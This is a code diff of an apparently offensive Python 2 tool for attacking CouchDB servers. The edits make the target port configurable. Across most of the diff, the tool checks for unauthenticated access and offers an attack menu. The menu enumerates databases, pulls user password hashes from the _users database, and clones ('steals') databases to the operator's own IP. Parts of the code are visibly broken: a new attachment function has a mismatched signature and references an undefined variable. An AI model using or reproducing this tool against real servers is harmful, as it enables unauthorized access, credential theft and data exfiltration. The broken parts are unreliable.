@@ -38,7 +38,7 @@ def couchScan(target,port,pingIt):
 
         if test == 0:	
             try:
-                conn = couchdb.Server("http://" + str(target) + ":5984/", timeout=4000)
+                conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")
 
                 try:
                     dbVer = conn.version()
@@ -58,7 +58,7 @@ def couchScan(target,port,pingIt):
 
     else:
         try:
-            conn = couchdb.Server("http://" + str(target) + ":5984/")
+            conn = couchdb.Server("http://" + str(target) + ":" + str(port) +"/")
 
             try:
                 dbVer = conn.version()
@@ -87,7 +87,7 @@ def netAttacks(target,port, myIP):
     needCreds = couchScan(target,port,False)
 
     if needCreds[0] == 0:
-        conn = couchdb.Server("http://" + str(target) + ":5984/")
+        conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")
         print "Successful access with no credentials!"
         mgtOpen = True
 
@@ -95,11 +95,11 @@ def netAttacks(target,port, myIP):
             print "Login required!"
             srvUser = raw_input("Enter server username: ")
             srvPass = raw_input("Enter server password: ")
-            uri = "http://" + srvUser + ":" + srvPass + "@" + target + ":5984/"
+            uri = "http://" + srvUser + ":" + srvPass + "@" + target + ":" + str(port) + "/"
             
             try:
                 conn = couchdb.Server(uri)
-                print "CouchDB authenticated on " + target + ":5984!"
+                print "CouchDB authenticated on " + target + ":" + str(port)
                 mgtOpen = True
 
             except:
@@ -107,16 +107,16 @@ def netAttacks(target,port, myIP):
                 return
     
     elif needCreds[0] == 2:
-        conn = couchdb.Server("http://" + str(target) + ":5984/")
+        conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")
         print "Access check failure.  Testing will continue but will be unreliable."
         mgtOpen = True
 
     elif needCreds[0] == 3:
-        print "Couldn't connect to CouchDB server."
+        raw_input ("Couldn't connect to CouchDB server.  Press enter to return to the main menu.")
         return
 
 	
-    mgtUrl = "http://" + target + ":5984/_utils"	
+    mgtUrl = "http://" + target + ":" + str(port) + "/_utils"
     #Future rev:  Add web management interface parsing
     try:
         mgtRespCode = urllib.urlopen(mgtUrl).getcode()
@@ -131,7 +131,7 @@ def netAttacks(target,port, myIP):
             print "\n"
             print "1-Get Server Version and Platform"
             print "2-Enumerate Databases/Users/Password Hashes"
-            print "3-Check for Attachments"
+            print "3-Check for Attachments (still under development)"
             print "4-Clone a Database"
             print "5-Return to Main Menu"
             attack = raw_input("Select an attack: ")
@@ -142,15 +142,15 @@ def netAttacks(target,port, myIP):
                 
             if attack == "2":
                 print "\n"
-                enumDbs(conn,target)
+                enumDbs(conn,target,port)
 
             if attack == "3":
                 print "\n"
-                enumGrid(conn)
+                enumAtt(conn,target,port)
                 
             if attack == "4":
                     print "\n"
-                    stealDBs(myIP,conn,target)
+                    stealDBs(myIP,conn,target,port)
 
             if attack == "5":
                     return
@@ -159,8 +159,21 @@ def getPlatInfo(couchConn, target):
     print "Server Info:"
     print "CouchDB Version: " + couchConn.version()
     return
+
+def enumAtt(conn,target):
+    dbList = []
+    print "Enumerating all attachments..."
     
-def enumDbs (couchConn,target):
+    for db in conn:
+        dbList.append(db)
+    
+    for dbName in dbList:
+        r = requests.get("http://" + target + ":" + str(port) + "/" + dbName + "/_all_docs" )
+        dbDict = r.json()
+        
+    
+   
+def enumDbs (couchConn,target,port):
     dbList = []
     userNames = []
     userHashes = []
@@ -178,7 +191,7 @@ def enumDbs (couchConn,target):
             print "Error:  Couldn't list databases.  The provided credentials may not have rights."
 
     if '_users' in dbList:
-        r = requests.get("http://" + target + ":5984/_users/_all_docs?startkey=\"org.couchdb.user\"&include_docs=true")
+        r = requests.get("http://" + target + ":" + str(port) + "/_users/_all_docs?startkey=\"org.couchdb.user\"&include_docs=true")
         userDict = r.json() 
         
         for counter in range (0,int(userDict["total_rows"])-int(userDict["offset"])):
@@ -208,7 +221,7 @@ def enumDbs (couchConn,target):
         
     return
 
-def stealDBs (myDB, couchConn, target):
+def stealDBs (myDB,couchConn,target,port):
     dbLoot = True
     menuItem = 1
     dbList = []
@@ -242,7 +255,7 @@ def stealDBs (myDB, couchConn, target):
         cloneAnother = raw_input("Database cloned.  Copy another (y/n)? ")
         
         if cloneAnother in yes_tag:
-            stealDBs(myDB,couchConn)
+            stealDBs(myDB,couchConn,target,port)
 
         else:
             return
